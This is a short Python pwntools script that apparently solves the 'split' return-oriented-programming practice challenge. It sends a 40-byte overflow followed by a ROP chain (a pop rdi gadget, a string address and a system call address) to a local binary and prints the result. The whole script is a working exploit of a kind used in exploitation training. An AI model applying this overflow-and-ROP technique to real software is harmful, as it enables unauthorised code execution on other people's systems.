from pwn import *

ex = "./split"
p = process(ex)

offset = 40
buffer = b'A' * offset

pop_rdi = p64(0x00000000004007c3)
cat_string = p64(0x00601060)
system_address = p64(0x40074B)

msg = buffer + pop_rdi + cat_string + system_address

p.sendline(msg)
out = p.recvall()

print(out)
